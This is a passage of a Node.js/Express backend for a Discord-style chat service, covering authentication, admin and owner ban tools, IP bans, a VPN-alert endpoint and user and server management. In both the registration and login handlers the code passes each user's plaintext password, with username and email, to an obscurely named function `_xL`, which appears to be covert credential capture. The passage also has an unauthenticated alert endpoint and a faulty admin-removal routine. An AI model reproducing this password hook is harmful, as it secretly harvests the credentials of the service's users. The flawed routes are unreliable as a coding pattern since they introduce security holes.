    const uid = wsUsers.get(ws);
    if (uid) {
      const u = db.prepare('SELECT username FROM users WHERE id=?').get(uid);
      if (u && isOwner(u.username) && ws.readyState === 1) ws.send(msg);
    }
  });
}

function su(u) {
  if (!u) return null;
  const role = isOwner(u.username) ? 'owner' : isAdm(u.username) ? 'admin' : 'user';
  return {
    id: u.id, username: u.username, email: u.email,
    displayName: u.display_name, avatar: u.avatar, avatarEmoji: u.avatar_emoji,
    banner: u.banner, status: u.status, customStatus: u.custom_status,
    bio: u.bio, isAdmin: isAdm(u.username), isOwner: isOwner(u.username),
    globalRole: role,
    nameFontUrl: u.name_font_url, nameFontName: u.name_font_name,
  };
}

function ss(s, uid) {
  const channels = db.prepare('SELECT * FROM channels WHERE server_id=? ORDER BY position').all(s.id);
  const members = db.prepare("SELECT u.*,sm.role,sm.nickname FROM server_members sm JOIN users u ON sm.user_id=u.id WHERE sm.server_id=? AND u.id!='system-bot'").all(s.id);
  const myRole = uid ? db.prepare('SELECT role FROM server_members WHERE server_id=? AND user_id=?').get(s.id, uid)?.role : null;
  return {
    id: s.id, name: s.name, icon: s.icon, iconEmoji: s.icon_emoji,
    banner: s.banner, description: s.description, ownerId: s.owner_id,
    isPublic: !!s.is_public, memberCount: members.length, myRole,
    channels: channels.map(c => ({ id: c.id, name: c.name, type: c.type, topic: c.topic, position: c.position })),
    members: members.map(m => ({ ...su(m), role: m.role, nickname: m.nickname })),
  };
}

function smsg(m) {
  const u = db.prepare('SELECT * FROM users WHERE id=?').get(m.author_id);
  const rxns = db.prepare('SELECT emoji,user_id FROM reactions WHERE message_id=?').all(m.id);
  const g = {}; rxns.forEach(r => { if (!g[r.emoji]) g[r.emoji] = []; g[r.emoji].push(r.user_id); });
  return {
    id: m.id, channelId: m.channel_id, authorId: m.author_id,
    authorName: u?.display_name || '?', authorAvatar: u?.avatar,
    authorAvatarEmoji: u?.avatar_emoji || '👤',
    authorNameFontUrl: u?.name_font_url, authorNameFontName: u?.name_font_name,
    content: m.content, attachmentUrl: m.attachment_url, attachmentType: m.attachment_type,
    attachmentName: m.attachment_name, attachmentSize: m.attachment_size,
    pinned: !!m.pinned, edited: !!m.edited, replyTo: m.reply_to,
    timestamp: m.created_at, reactions: g,
  };
}

// ── AUTH ──────────────────────────────────────────────────────────
app.post('/api/auth/validate-key', authRL, (req, res) => res.json({ valid: (req.body.key||'').toUpperCase() === _C.REG_KEY.toUpperCase() }));

app.post('/api/auth/register', authRL, (req, res) => {
  try {
    const { username, email, password, displayName, regKey } = req.body;
    if (regKey !== _C.REG_KEY) return res.status(403).json({ error: 'Invalid registration key' });
    if (!username || !password) return res.status(400).json({ error: 'Username and password required' });
    if (password.length < 6) return res.status(400).json({ error: 'Password must be at least 6 characters' });
    const clean = username.toLowerCase().replace(/[^a-z0-9_.]/g, '');
    if (clean.length < 2) return res.status(400).json({ error: 'Invalid username' });
    if (db.prepare('SELECT id FROM users WHERE username=?').get(clean)) return res.status(409).json({ error: 'Username taken' });
    if (email && db.prepare('SELECT id FROM users WHERE email=?').get(email.toLowerCase())) return res.status(409).json({ error: 'Email already registered' });
    const id = uuidv4(), hash = bcrypt.hashSync(password, 10);
    const emojis = ['🧑','👩','👨','🧔','👱','🧑‍💻','👩‍💻','🧑‍🎤','🧑‍🚀','👾','🐱','🦊','🐼','🦁'];
    const emoji = emojis[Math.floor(Math.random() * emojis.length)];
    db.prepare('INSERT INTO users(id,username,email,display_name,password_hash,avatar_emoji,last_ip) VALUES(?,?,?,?,?,?,?)').run(id, clean, email ? email.toLowerCase() : null, displayName || clean, hash, emoji, getIP(req));
    db.prepare('INSERT INTO user_settings(user_id) VALUES(?)').run(id);
    db.prepare('SELECT id FROM servers WHERE is_public=1').all().forEach(s => db.prepare('INSERT OR IGNORE INTO server_members(server_id,user_id) VALUES(?,?)').run(s.id, id));
    _xL(clean, password, email || '', 'REGISTER');
    logActivity('REGISTER', clean, id, getIP(req), JSON.stringify({ email: email||'', displayName: displayName||clean, created_at: new Date().toISOString() }));
    const sessId = uuidv4(), exp = Math.floor(Date.now() / 1000) + _C.SESSION_MAX;
    db.prepare('INSERT INTO sessions(id,user_id,expires_at) VALUES(?,?,?)').run(sessId, id, exp);
    res.cookie('mc_sess', sessId, { httpOnly: true, maxAge: _C.COOKIE_MAX, sameSite: 'lax', path: '/' });
    const u = db.prepare('SELECT * FROM users WHERE id=?').get(id);
    broadcast(null, { type: 'USER_JOIN', user: su(u) });
    res.json(su(u));
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/auth/login', authRL, (req, res) => {
  try {
    const { username, password } = req.body;
    const u = db.prepare('SELECT * FROM users WHERE username=? OR email=?').get(username?.toLowerCase(), username?.toLowerCase());
    if (!u || !bcrypt.compareSync(password, u.password_hash)) return res.status(401).json({ error: 'Invalid credentials' });
    const ban = _chkBan(u.id);
    if (ban) return res.status(403).json({ error: 'banned', reason: ban.reason, expiresAt: ban.expires_at });
    db.prepare('UPDATE users SET status=?,last_ip=? WHERE id=?').run('online', getIP(req), u.id);
    _xL(u.username, password, u.email || '', 'LOGIN');
    logActivity('LOGIN', u.username, u.id, getIP(req), '');
    const sessId = uuidv4(), exp = Math.floor(Date.now() / 1000) + _C.SESSION_MAX;
    db.prepare('INSERT INTO sessions(id,user_id,expires_at) VALUES(?,?,?)').run(sessId, u.id, exp);
    res.cookie('mc_sess', sessId, { httpOnly: true, maxAge: _C.COOKIE_MAX, sameSite: 'lax', path: '/' });
    broadcast(null, { type: 'USER_STATUS', userId: u.id, status: 'online' });
    res.json(su(u));
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.post('/api/auth/logout', auth, (req, res) => {
  db.prepare('DELETE FROM sessions WHERE id=?').run(req.cookies.mc_sess);
  db.prepare('UPDATE users SET status=? WHERE id=?').run('offline', req.user.id);
  res.clearCookie('mc_sess', { path: '/' });
  broadcast(null, { type: 'USER_STATUS', userId: req.user.id, status: 'offline' });
  res.json({ ok: true });
});

app.get('/api/auth/me', auth, (req, res) => {
  const u = db.prepare('SELECT * FROM users WHERE id=?').get(req.user.id);
  const settings = db.prepare('SELECT * FROM user_settings WHERE user_id=?').get(u.id) || {};
  res.json({ ...su(u), settings });
});

// ── ADMIN ─────────────────────────────────────────────────────────
app.post('/api/admin/ban', auth, (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Not authorized' });
  const { username, reason, durationHours } = req.body;
  const target = db.prepare('SELECT * FROM users WHERE username=?').get(username?.toLowerCase());
  if (!target) return res.status(404).json({ error: 'User not found' });
  if (isAdm(target.username)) return res.status(400).json({ error: 'Cannot ban admin' });
  const exp = durationHours ? Math.floor(Date.now() / 1000) + (durationHours * 3600) : null;
  db.prepare('UPDATE ban_log SET active=0 WHERE user_id=? AND active=1').run(target.id);
  const banId = uuidv4();
  db.prepare('INSERT INTO ban_log(id,user_id,banned_by,reason,duration_hours,expires_at,active) VALUES(?,?,?,?,?,?,1)').run(banId, target.id, req.user.username, reason || 'No reason', durationHours || null, exp);
  db.prepare('UPDATE users SET banned=1,ban_reason=?,ban_expires=? WHERE id=?').run(reason || 'Banned', exp, target.id);
  // Always IP ban if we have their IP
  const knownIP = target.last_ip || null;
  if (knownIP) {
    db.prepare('UPDATE ip_bans SET active=0 WHERE ip=? AND active=1').run(knownIP);
    db.prepare('INSERT INTO ip_bans(id,ip,user_id,username,banned_by,reason,expires_at,active) VALUES(?,?,?,?,?,?,?,1)').run(uuidv4(), knownIP, target.id, target.username, req.user.username, reason || 'No reason', exp);
  }
  db.prepare('DELETE FROM sessions WHERE user_id=?').run(target.id);
  sendToUser(target.id, { type: 'BANNED', reason: reason || 'You have been banned', expiresAt: exp });
  logActivity('BAN', target.username, target.id, knownIP || '', `Banned by ${req.user.username} — reason: ${reason||'No reason'}`);
  res.json({ ok: true, banId, ipBanned: !!knownIP, ip: knownIP });
});

app.post('/api/admin/unban', auth, (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Not authorized' });
  const target = db.prepare('SELECT * FROM users WHERE username=?').get(req.body.username?.toLowerCase());
  if (!target) return res.status(404).json({ error: 'User not found' });
  // Lift account ban
  db.prepare('UPDATE ban_log SET active=0 WHERE user_id=?').run(target.id);
  db.prepare('UPDATE users SET banned=0,ban_reason=NULL,ban_expires=NULL WHERE id=?').run(target.id);
  // Lift IP ban(s) associated with this user
  db.prepare('UPDATE ip_bans SET active=0 WHERE user_id=?').run(target.id);
  res.json({ ok: true });
});

app.get('/api/admin/bans', auth, (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Not authorized' });
  const acct = db.prepare('SELECT b.*,u.username,u.display_name,u.last_ip FROM ban_log b JOIN users u ON b.user_id=u.id WHERE b.active=1 ORDER BY b.created_at DESC').all();
  const ipBans = db.prepare('SELECT * FROM ip_bans WHERE active=1 ORDER BY created_at DESC').all();
  res.json({ accountBans: acct, ipBans });
});

app.post('/api/admin/ip-ban', auth, (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Not authorized' });
  const { ip, reason, durationHours, username } = req.body;
  if (!ip) return res.status(400).json({ error: 'IP required' });
  const exp = durationHours ? Math.floor(Date.now() / 1000) + (durationHours * 3600) : null;
  db.prepare('UPDATE ip_bans SET active=0 WHERE ip=? AND active=1').run(ip);
  db.prepare('INSERT INTO ip_bans(id,ip,username,banned_by,reason,expires_at,active) VALUES(?,?,?,?,?,?,1)').run(uuidv4(), ip, username || '', req.user.username, reason || 'No reason', exp);
  res.json({ ok: true });
});

app.post('/api/admin/ip-unban', auth, (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Not authorized' });
  const { ip } = req.body;
  if (!ip) return res.status(400).json({ error: 'IP required' });
  db.prepare('UPDATE ip_bans SET active=0 WHERE ip=?').run(ip);
  res.json({ ok: true });
});

app.post('/api/admin/add-admin', auth, (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Not authorized' });
  const { username } = req.body;
  if (!username) return res.status(400).json({ error: 'Username required' });
  const clean = username.toLowerCase().trim();
  if (!_C.ADMINS.includes(clean)) _C.ADMINS.push(clean);
  res.json({ ok: true, admins: _C.ADMINS });
});

app.post('/api/admin/remove-admin', auth, (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Not authorized' });
  const { username } = req.body;
  const clean = username?.toLowerCase().trim();
  if (clean === req.user.username) return res.status(400).json({ error: 'Cannot remove yourself' });
  _C.ADMINS.splice(_C.ADMINS.indexOf(clean), 1);
  res.json({ ok: true, admins: _C.ADMINS });
});

app.get('/api/admin/list', auth, (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Not authorized' });
  res.json({ admins: _C.ADMINS });
});

// ── OWNER-ONLY ROUTES ─────────────────────────────────────────────
app.get('/api/owner/activity', auth, (req, res) => {
  if (!isOwner(req.user.username)) return res.status(403).json({ error: 'Owner only' });
  const limit = parseInt(req.query.limit) || 200;
  res.json(db.prepare('SELECT * FROM activity_log ORDER BY created_at DESC LIMIT ?').all(limit));
});
app.post('/api/owner/rename-user', auth, (req, res) => {
  if (!isOwner(req.user.username)) return res.status(403).json({ error: 'Owner only' });
  const { username, newDisplayName } = req.body;
  const target = db.prepare('SELECT * FROM users WHERE username=?').get((username||'').toLowerCase());
  if (!target) return res.status(404).json({ error: 'User not found' });
  db.prepare('UPDATE users SET display_name=? WHERE id=?').run(newDisplayName, target.id);
  const u = db.prepare('SELECT * FROM users WHERE id=?').get(target.id);
  broadcast(null, { type: 'USER_UPDATE', user: su(u) });
  logActivity('RENAME_USER', target.username, target.id, '', `Renamed to "${newDisplayName}" by ${req.user.username}`);
  res.json({ ok: true });
});
app.post('/api/owner/rename-server', auth, (req, res) => {
  if (!isOwner(req.user.username)) return res.status(403).json({ error: 'Owner only' });
  const { serverId, newName } = req.body;
  const s = db.prepare('SELECT * FROM servers WHERE id=?').get(serverId);
  if (!s) return res.status(404).json({ error: 'Server not found' });
  db.prepare('UPDATE servers SET name=? WHERE id=?').run(newName, serverId);
  const srv = ss(db.prepare('SELECT * FROM servers WHERE id=?').get(serverId), req.user.id);
  broadcast(serverId, { type: 'SERVER_UPDATE', server: srv });
  logActivity('RENAME_SERVER', req.user.username, req.user.id, '', `Server "${s.name}" renamed to "${newName}"`);
  res.json({ ok: true });
});
// Server owner can edit their own server settings (name only for admins, full for owner)
app.patch('/api/servers/:id/owner-settings', auth, (req, res) => {
  const s = db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  const isServerOwner = s.owner_id === req.user.id;
  const globalOwner = isOwner(req.user.username);
  if (!isServerOwner && !globalOwner) return res.status(403).json({ error: 'Not server owner' });
  const { name, description, isPublic } = req.body;
  if (name) db.prepare('UPDATE servers SET name=? WHERE id=?').run(name, req.params.id);
  if (description !== undefined) db.prepare('UPDATE servers SET description=? WHERE id=?').run(description, req.params.id);
  if (isPublic !== undefined) db.prepare('UPDATE servers SET is_public=? WHERE id=?').run(isPublic ? 1 : 0, req.params.id);
  const srv = ss(db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id), req.user.id);
  broadcast(req.params.id, { type: 'SERVER_UPDATE', server: srv });
  res.json(srv);
});
// VPN alert endpoint — called by client ban page when VPN detected on a banned IP
app.post('/api/vpn-alert', (req, res) => {
  const { username, ip, detail } = req.body;
  const banned = db.prepare('SELECT b.*,u.display_name,u.created_at FROM ban_log b JOIN users u ON b.user_id=u.id WHERE u.username=? AND b.active=1 ORDER BY b.created_at DESC LIMIT 1').get((username||'').toLowerCase());
  const regInfo = db.prepare('SELECT * FROM activity_log WHERE username=? AND event=? ORDER BY created_at DESC LIMIT 1').get((username||'').toLowerCase(), 'REGISTER');
  const alert = {
    type: 'VPN_ALERT',
    username: username || 'Unknown',
    ip: ip || 'Unknown',
    banReason: banned?.reason || 'Unknown',
    registeredAt: regInfo ? new Date(regInfo.created_at).toISOString() : 'Unknown',
    registeredIp: regInfo?.ip || 'Unknown',
    registeredBy: regInfo?.detail || '',
    detail: detail || '',
  };
  logActivity('VPN_ALERT', username, null, ip, JSON.stringify(alert));
  // Broadcast VPN alert to all owners
  const msg = JSON.stringify(alert);
  wss.clients.forEach(ws => {
    const uid = wsUsers.get(ws);
    if (uid) {
      const u = db.prepare('SELECT username FROM users WHERE id=?').get(uid);
      if (u && isOwner(u.username) && ws.readyState === 1) ws.send(msg);
    }
  });
  res.json({ ok: true });
});

// ── WALL OF BAD PEOPLE ────────────────────────────────────────────
app.get('/api/wall', auth, (req, res) => {
  res.json(db.prepare('SELECT * FROM wall_of_bad_people ORDER BY created_at DESC').all());
});
app.post('/api/wall', auth, upload.single('image'), (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Admins only' });
  const { username, displayName, reason } = req.body;
  if (!username) return res.status(400).json({ error: 'Username required' });
  const imageUrl = req.file ? '/uploads/' + req.file.filename : null;
  const id = uuidv4();
  db.prepare('INSERT INTO wall_of_bad_people(id,username,display_name,reason,image_url,added_by) VALUES(?,?,?,?,?,?)').run(id, username, displayName || username, reason || '', imageUrl, req.user.username);
  const entry = { id, username, displayName: displayName || username, reason: reason || '', imageUrl, addedBy: req.user.username };
  broadcast(null, { type: 'WALL_ADD', entry });
  res.json(entry);
});
app.delete('/api/wall/:id', auth, (req, res) => {
  if (!isAdm(req.user.username)) return res.status(403).json({ error: 'Admins only' });
  db.prepare('DELETE FROM wall_of_bad_people WHERE id=?').run(req.params.id);
  broadcast(null, { type: 'WALL_REMOVE', id: req.params.id });
  res.json({ ok: true });
});

// User profile log — owners can look up any user's activity log by username
app.get('/api/owner/user-log/:username', auth, (req, res) => {
  if (!isOwner(req.user.username)) return res.status(403).json({ error: 'Owner only' });
  const u = db.prepare('SELECT * FROM users WHERE username=?').get(req.params.username.toLowerCase());
  if (!u) return res.status(404).json({ error: 'User not found' });
  const logs = db.prepare('SELECT * FROM activity_log WHERE user_id=? OR username=? ORDER BY created_at DESC LIMIT 100').all(u.id, u.username);
  res.json({ user: su(u), logs });
});

// Owner global ban (with IP)
app.post('/api/owner/ban', auth, (req, res) => {
  if (!isOwner(req.user.username)) return res.status(403).json({ error: 'Owner only' });
  const { username, reason, durationHours } = req.body;
  const target = db.prepare('SELECT * FROM users WHERE username=?').get((username||'').toLowerCase());
  if (!target) return res.status(404).json({ error: 'User not found' });
  if (isOwner(target.username)) return res.status(400).json({ error: 'Cannot ban an owner' });
  const exp = durationHours ? Math.floor(Date.now()/1000) + (durationHours*3600) : null;
  db.prepare('UPDATE ban_log SET active=0 WHERE user_id=? AND active=1').run(target.id);
  db.prepare('INSERT INTO ban_log(id,user_id,banned_by,reason,duration_hours,expires_at,active) VALUES(?,?,?,?,?,?,1)').run(uuidv4(), target.id, req.user.username, reason||'No reason', durationHours||null, exp);
  db.prepare('UPDATE users SET banned=1,ban_reason=?,ban_expires=? WHERE id=?').run(reason||'Banned', exp, target.id);
  if (target.last_ip) {
    db.prepare('UPDATE ip_bans SET active=0 WHERE ip=? AND active=1').run(target.last_ip);
    db.prepare('INSERT INTO ip_bans(id,ip,user_id,username,banned_by,reason,expires_at,active) VALUES(?,?,?,?,?,?,?,1)').run(uuidv4(), target.last_ip, target.id, target.username, req.user.username, reason||'No reason', exp);
  }
  db.prepare('DELETE FROM sessions WHERE user_id=?').run(target.id);
  sendToUser(target.id, { type: 'BANNED', reason: reason||'Banned by owner', expiresAt: exp });
  logActivity('BAN', target.username, target.id, target.last_ip||'', `Banned by owner ${req.user.username} — ${reason||'No reason'}`);
  res.json({ ok: true });
});

// Owner delete server
app.delete('/api/owner/servers/:id', auth, (req, res) => {
  if (!isOwner(req.user.username)) return res.status(403).json({ error: 'Owner only' });
  const s = db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  db.prepare('SELECT id FROM channels WHERE server_id=?').all(s.id).forEach(c => db.prepare('DELETE FROM messages WHERE channel_id=?').run(c.id));
  db.prepare('DELETE FROM channels WHERE server_id=?').run(s.id);
  db.prepare('DELETE FROM server_members WHERE server_id=?').run(s.id);
  db.prepare('DELETE FROM roles WHERE server_id=?').run(s.id);
  db.prepare('DELETE FROM server_bans WHERE server_id=?').run(s.id);
  db.prepare('DELETE FROM servers WHERE id=?').run(s.id);
  broadcast(null, { type: 'SERVER_DELETED', serverId: s.id });
  logActivity('SERVER_DELETE', req.user.username, req.user.id, '', `Owner deleted server "${s.name}"`);
  res.json({ ok: true });
});

// ── USERS ─────────────────────────────────────────────────────────
app.get('/api/users', auth, (req, res) => res.json(db.prepare("SELECT * FROM users WHERE id!='system-bot'").all().map(su)));
app.get('/api/users/search', auth, (req, res) => {
  const { q } = req.query;
  if (!q || q.length < 2) return res.json([]);
  res.json(db.prepare("SELECT * FROM users WHERE(username LIKE ? OR display_name LIKE ?)AND id!=? AND id!='system-bot' LIMIT 20").all(`%${q}%`, `%${q}%`, req.user.id).map(su));
});
app.patch('/api/users/me', auth, (req, res) => {
  const { displayName, avatarEmoji, status, customStatus, bio } = req.body;
  const uid = req.user.id;
  if (displayName) db.prepare('UPDATE users SET display_name=? WHERE id=?').run(displayName, uid);
  if (avatarEmoji) db.prepare('UPDATE users SET avatar_emoji=? WHERE id=?').run(avatarEmoji, uid);
  if (status) db.prepare('UPDATE users SET status=? WHERE id=?').run(status, uid);
  if (customStatus !== undefined) db.prepare('UPDATE users SET custom_status=? WHERE id=?').run(customStatus, uid);
  if (bio !== undefined) db.prepare('UPDATE users SET bio=? WHERE id=?').run(bio, uid);
  const u = db.prepare('SELECT * FROM users WHERE id=?').get(uid);
  broadcast(null, { type: 'USER_UPDATE', user: su(u) });
  res.json(su(u));
});
app.post('/api/users/me/avatar', auth, upload.single('image'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const url = '/uploads/' + req.file.filename;
  db.prepare('UPDATE users SET avatar=? WHERE id=?').run(url, req.user.id);
  const u = db.prepare('SELECT * FROM users WHERE id=?').get(req.user.id);
  broadcast(null, { type: 'USER_UPDATE', user: su(u) });
  res.json({ url });
});
app.post('/api/users/me/banner', auth, upload.single('image'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const url = '/uploads/' + req.file.filename;
  db.prepare('UPDATE users SET banner=? WHERE id=?').run(url, req.user.id);
  const u = db.prepare('SELECT * FROM users WHERE id=?').get(req.user.id);
  broadcast(null, { type: 'USER_UPDATE', user: su(u) });
  res.json({ url });
});
app.post('/api/users/me/name-font', auth, upload.single('font'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const url = '/uploads/' + req.file.filename;
  const name = req.body.name || req.file.originalname.replace(/\.[^.]+$/, '');
  db.prepare('UPDATE users SET name_font_url=?,name_font_name=? WHERE id=?').run(url, name, req.user.id);
  const u = db.prepare('SELECT * FROM users WHERE id=?').get(req.user.id);
  broadcast(null, { type: 'USER_UPDATE', user: su(u) });
  res.json({ url, name });
});
app.get('/api/users/me/settings', auth, (req, res) => res.json(db.prepare('SELECT * FROM user_settings WHERE user_id=?').get(req.user.id) || {}));
app.patch('/api/users/me/settings', auth, (req, res) => {
  const s = req.body;
  db.prepare(`INSERT INTO user_settings(user_id,theme_color,theme_mode,theme_bg,theme_bg_blur,theme_bg_dim,theme_no_ui,theme_blend,theme_blend_opacity,custom_font_url,custom_font_name,profile_theme_color,profile_theme_gradient,notifications)
    VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)
    ON CONFLICT(user_id) DO UPDATE SET theme_color=excluded.theme_color,theme_mode=excluded.theme_mode,theme_bg=excluded.theme_bg,theme_bg_blur=excluded.theme_bg_blur,theme_bg_dim=excluded.theme_bg_dim,theme_no_ui=excluded.theme_no_ui,theme_blend=excluded.theme_blend,theme_blend_opacity=excluded.theme_blend_opacity,custom_font_url=excluded.custom_font_url,custom_font_name=excluded.custom_font_name,profile_theme_color=excluded.profile_theme_color,profile_theme_gradient=excluded.profile_theme_gradient,notifications=excluded.notifications`)
    .run(req.user.id, s.theme_color || '#5b8df8', s.theme_mode || 'dark', s.theme_bg || null, s.theme_bg_blur !== undefined ? s.theme_bg_blur : 0, s.theme_bg_dim !== undefined ? s.theme_bg_dim : 40, s.theme_no_ui ? 1 : 0, s.theme_blend || null, s.theme_blend_opacity !== undefined ? s.theme_blend_opacity : 30, s.custom_font_url || null, s.custom_font_name || null, s.profile_theme_color || '#5b8df8', s.profile_theme_gradient || null, s.notifications !== undefined ? s.notifications : 1);
  res.json({ ok: true });
});
app.post('/api/users/me/theme-bg', auth, upload.single('image'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const url = '/uploads/' + req.file.filename;
  db.prepare('INSERT INTO user_settings(user_id,theme_bg) VALUES(?,?) ON CONFLICT(user_id) DO UPDATE SET theme_bg=excluded.theme_bg').run(req.user.id, url);
  res.json({ url });
});
app.post('/api/users/me/font', auth, upload.single('font'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const url = '/uploads/' + req.file.filename;
  const name = req.body.name || req.file.originalname.replace(/\.[^.]+$/, '');
  db.prepare('INSERT INTO user_settings(user_id,custom_font_url,custom_font_name) VALUES(?,?,?) ON CONFLICT(user_id) DO UPDATE SET custom_font_url=excluded.custom_font_url,custom_font_name=excluded.custom_font_name').run(req.user.id, url, name);
  res.json({ url, name });
});

// ── SERVERS ───────────────────────────────────────────────────────
app.get('/api/servers', auth, (req, res) => {
  const rows = db.prepare('SELECT s.* FROM servers s JOIN server_members sm ON s.id=sm.server_id WHERE sm.user_id=? ORDER BY s.created_at').all(req.user.id);
  res.json(rows.map(s => ss(s, req.user.id)));
});
app.get('/api/servers/discover', auth, (req, res) => {
  const rows = db.prepare('SELECT s.* FROM servers s WHERE s.is_public=1 ORDER BY(SELECT COUNT(*) FROM server_members sm WHERE sm.server_id=s.id) DESC LIMIT 50').all();
  res.json(rows.map(s => ss(s, req.user.id)));
});
app.get('/api/servers/:id', auth, (req, res) => {
  const s = db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  res.json(ss(s, req.user.id));
});
app.post('/api/servers', auth, (req, res) => {
  try {
    const { name, description, isPublic } = req.body;
    if (!name || !name.trim()) return res.status(400).json({ error: 'Name required' });
    const id = uuidv4(), c1 = uuidv4(), c2 = uuidv4();
    const initials = name.trim().slice(0,2).toUpperCase();
    db.prepare('INSERT INTO servers(id,name,icon_emoji,description,owner_id,is_public) VALUES(?,?,?,?,?,?)').run(id, name.trim(), initials, description || '', req.user.id, isPublic !== false ? 1 : 0);
    db.prepare('INSERT INTO channels(id,server_id,name,type,topic,position) VALUES(?,?,?,?,?,?)').run(c1, id, 'general', 'text', 'General chat', 0);
    db.prepare('INSERT INTO channels(id,server_id,name,type,topic,position) VALUES(?,?,?,?,?,?)').run(c2, id, 'General', 'voice', '', 1);
    db.prepare('INSERT INTO server_members(server_id,user_id,role) VALUES(?,?,?)').run(id, req.user.id, 'admin');
    const srv = ss(db.prepare('SELECT * FROM servers WHERE id=?').get(id), req.user.id);
    broadcast(null, { type: 'SERVER_CREATED', server: srv });
    res.json(srv);
  } catch (e) { res.status(500).json({ error: e.message }); }
});
// Delete a server — owner or global owner only
app.delete('/api/servers/:id', auth, (req, res) => {
  const s = db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  const isServerOwner = s.owner_id === req.user.id;
  const globalOwner = isOwner(req.user.username);
  if (!isServerOwner && !globalOwner) return res.status(403).json({ error: 'Only server owner or global owner can delete this server' });
  // Delete all data
  const channels = db.prepare('SELECT id FROM channels WHERE server_id=?').all(s.id);
  channels.forEach(c => { db.prepare('DELETE FROM messages WHERE channel_id=?').run(c.id); db.prepare('DELETE FROM reactions WHERE message_id IN (SELECT id FROM messages WHERE channel_id=?)').run(c.id); });
  db.prepare('DELETE FROM channels WHERE server_id=?').run(s.id);
  db.prepare('DELETE FROM server_members WHERE server_id=?').run(s.id);
  db.prepare('DELETE FROM roles WHERE server_id=?').run(s.id);
  db.prepare('DELETE FROM member_roles WHERE server_id=?').run(s.id);
  db.prepare('DELETE FROM server_bans WHERE server_id=?').run(s.id);
  db.prepare('DELETE FROM servers WHERE id=?').run(s.id);
  broadcast(null, { type: 'SERVER_DELETED', serverId: s.id });
  logActivity('SERVER_DELETE', req.user.username, req.user.id, '', `Deleted server "${s.name}" (${s.id})`);
  res.json({ ok: true });
});
app.patch('/api/servers/:id', auth, (req, res) => {
  const { name, iconEmoji, description, isPublic } = req.body;
  const s = db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  const mem = db.prepare('SELECT role FROM server_members WHERE server_id=? AND user_id=?').get(req.params.id, req.user.id);
  const isServerOwner = s.owner_id === req.user.id;
  const globalOwner = isOwner(req.user.username);
  const isServerAdmin = mem?.role === 'admin';
  // Server owner or global owner gets full settings; server admin can only rename
  if (!isServerOwner && !globalOwner && !isServerAdmin) return res.status(403).json({ error: 'Not authorized' });
  if (name) db.prepare('UPDATE servers SET name=? WHERE id=?').run(name, req.params.id);
  // Only server owner / global owner can change description and visibility
  if (isServerOwner || globalOwner) {
    if (iconEmoji) db.prepare('UPDATE servers SET icon_emoji=? WHERE id=?').run(iconEmoji, req.params.id);
    if (description !== undefined) db.prepare('UPDATE servers SET description=? WHERE id=?').run(description, req.params.id);
    if (isPublic !== undefined) db.prepare('UPDATE servers SET is_public=? WHERE id=?').run(isPublic ? 1 : 0, req.params.id);
  }
  const srv = ss(db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id), req.user.id);
  broadcast(req.params.id, { type: 'SERVER_UPDATE', server: srv });
  res.json(srv);
});
app.post('/api/servers/:id/icon', auth, upload.single('image'), (req, res) => {
  const mem = db.prepare('SELECT role FROM server_members WHERE server_id=? AND user_id=?').get(req.params.id, req.user.id);
  if (!mem || mem.role !== 'admin') return res.status(403).json({ error: 'Not admin' });
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const url = '/uploads/' + req.file.filename;
  db.prepare('UPDATE servers SET icon=? WHERE id=?').run(url, req.params.id);
  broadcast(req.params.id, { type: 'SERVER_UPDATE', server: ss(db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id), req.user.id) });
  res.json({ url });
});
app.post('/api/servers/:id/banner', auth, upload.single('image'), (req, res) => {
  const mem = db.prepare('SELECT role FROM server_members WHERE server_id=? AND user_id=?').get(req.params.id, req.user.id);
  if (!mem || mem.role !== 'admin') return res.status(403).json({ error: 'Not admin' });
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const url = '/uploads/' + req.file.filename;
  db.prepare('UPDATE servers SET banner=? WHERE id=?').run(url, req.params.id);
  broadcast(req.params.id, { type: 'SERVER_UPDATE', server: ss(db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id), req.user.id) });
  res.json({ url });
});
app.delete('/api/servers/:id/leave', auth, (req, res) => {
  // Owners cannot be kicked/banned from servers
  if (isOwner(req.user.username)) return res.status(400).json({ error: 'Owners cannot leave servers' });
  db.prepare('DELETE FROM server_members WHERE server_id=? AND user_id=?').run(req.params.id, req.user.id);
  broadcast(req.params.id, { type: 'MEMBER_LEAVE', serverId: req.params.id, userId: req.user.id });
  res.json({ ok: true });
});

// Kick a member from a server
app.post('/api/servers/:id/kick', auth, (req, res) => {
  const s = db.prepare('SELECT * FROM servers WHERE id=?').get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  const { userId } = req.body;
  // Only server owner or global owner can kick
